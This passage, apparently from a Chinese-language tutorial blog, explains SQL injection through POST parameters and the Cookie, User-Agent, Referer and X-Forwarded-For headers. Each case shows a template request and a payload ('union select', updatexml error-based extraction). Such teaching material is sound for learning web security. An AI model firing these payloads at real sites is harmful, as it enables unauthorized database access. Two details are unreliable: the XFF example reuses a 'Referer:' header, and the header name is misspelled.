class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">POST</span> <span class="hljs-string">/sqli/select.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/x-www-form-urlencoded<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Proxy-Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>xxxx<br><br><span class="language-abnf"><span class="hljs-attribute">id</span><span class="hljs-operator">=</span><span class="hljs-number">1</span></span><br></code></pre></td></tr></table></figure><p>​可通过修改请求包内的参数进行注入:</p><p>​<code>id=1 union select 1,2</code></p><h4 id="Cookie注入"><a href="#Cookie注入" class="headerlink" title="Cookie注入:"></a>Cookie注入:</h4><p>​Cookie型注入点位于HTTP请求包的Cookie头中</p><p>​例如:</p><p>​<code>SELECT col1,col2 FROM table1 WHERE id=$_Cookie[&#39;id&#39;];</code></p><p>​请求包一般为:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli/select.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Cookie</span><span class="hljs-punctuation">: </span>id=1;<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Proxy-Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>xxxx<br></code></pre></td></tr></table></figure><p>​可通过修改Cookie进行注入:</p><p>​<code>id=1 union select 1,2;</code></p><h4 id="User-Agent注入"><a href="#User-Agent注入" class="headerlink" title="User-Agent注入:"></a>User-Agent注入:</h4><p>​UA型注入点位于HTTP请求包的UA头中</p><p>​例如:</p><p>​<code>INSERT INTO uagents(id,uagent) VALUES($id,&#39;$_SERVER[&quot;HTTP_USER_AGENT&quot;]&#39;)</code></p><p>​请求包一般为:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli/select.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Proxy-Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>xxxx<br></code></pre></td></tr></table></figure><p>​可通过修改UA头进行注入:</p><p>​<code>User-Agent: xxx&#39; AND updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),1) AND &#39;</code></p><h4 id="Referer注入"><a href="#Referer注入" class="headerlink" title="Referer注入:"></a>Referer注入:</h4><p>​Referer型注入点位于HTTP请求包的Referer头中</p><p>​例如:</p><p>​<code>INSERT INTO Referers(id,referer) VALUES($id,&#39;$_SERVER[&quot;HTTP_REFERER&quot;]&#39;)</code></p><p>​请求包一般为:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli/select.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Proxy-Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>xxxx<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>xxxx<br></code></pre></td></tr></table></figure><p>​可通过修改Referer头进行注入:</p><p>​<code>Referer: xxx&#39; AND updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),1) AND &#39;</code></p><h4 id="X-For-Forward注入"><a href="#X-For-Forward注入" class="headerlink" title="X-For-Forward注入:"></a>X-For-Forward注入:</h4><p>​XFF型注入点位于HTTP请求包的XFF头中</p><p>​例如:</p><p>​<code>INSERT INTO xffs(id,xff) VALUES($id,&#39;$_SERVER[&quot;HTTP_X_For_Forward&quot;]&#39;)</code></p><p>​请求包一般为:</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs HTTP"><span class="hljs-keyword">GET</span> <span class="hljs-string">/sqli/select.php</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>xxx<br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Origin</span><span class="hljs-punctuation">: </span>xxxxx<br><span class="hljs-attribute">Proxy-Connection</span><span class="hljs-punctuation">: </span>keep-alive<br><span class="hljs-attribute">X-For-Forward</span><span class="hljs-punctuation">: </span>xxxx<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>xxxx<br></code></pre></td></tr></table></figure><p>​可通过修改XFF头进行注入:</p><p>​<code>Referer: xxx&#39; AND updatexml(1,concat(&#39;~&#39;,database(),&#39;~&#39;),1) AND &#39;</code></p><hr><p>&#x2F;&#x2F;TODO</p><h3 id="特殊注入"><a href="#特殊注入" class="headerlink" title="特殊注入:"></a>特殊注入:</h3><h4 id="双注入"><a href="#双注入" class="headerlink" title="双注入:"></a>双注入:</h4><h4 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入:"></a>宽字节注入:</h4>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
